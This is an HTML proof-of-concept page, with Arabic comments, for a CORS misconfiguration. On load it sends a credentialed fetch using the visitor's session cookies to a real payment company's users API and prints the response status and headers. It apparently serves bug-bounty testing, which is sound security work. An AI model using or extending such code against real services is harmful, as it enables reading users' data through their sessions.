<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Rapyd CORS PoC (Safe)</title>
</head>
<body>
<h2>Rapyd CORS Misconfiguration PoC</h2>
<pre id="output"></pre>

<script>
const output = document.getElementById('output');

// الدالة اللي هتعمل request
async function testCORS() {
    try {
        const res = await fetch('https://dashboard.rapyd.net/v1/users', {
            method: 'GET',
            credentials: 'include' // مهمة عشان تبعت session cookies
        });

        // نجمع الـ headers في object
        let headers = {};
        for (let pair of res.headers.entries()) {
            headers[pair[0]] = pair[1];
        }

        const data = {
            status: res.status,
            statusText: res.statusText,
            headers: headers
        };

        output.textContent = JSON.stringify(data, null, 2);
    } catch (err) {
        output.textContent = 'Error: ' + err;
    }
}

// نفّذ الدالة
testCORS();
</script>
</body>
</html>
